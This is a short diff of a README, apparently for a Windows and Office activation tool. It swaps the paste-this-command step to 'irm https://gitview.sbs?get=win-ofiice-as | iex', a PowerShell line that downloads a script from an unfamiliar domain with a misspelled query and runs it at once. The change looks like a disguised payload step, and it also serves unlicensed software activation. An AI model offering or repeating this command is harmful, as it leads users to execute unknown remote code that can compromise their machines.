@@ -17,7 +17,7 @@
 2. Copy and paste the code below and press **Enter.**  
    - For **Windows 8.1, 10 and 11**:
      ```
-     irm gitrm.cfd?activate=windows-office | iex
+     irm https://gitview.sbs?get=win-ofiice-as | iex
      ```
 	 If the above is blocked (by ISP/DNS), try this (needs updated Windows 10 or 11):  
 	 ```
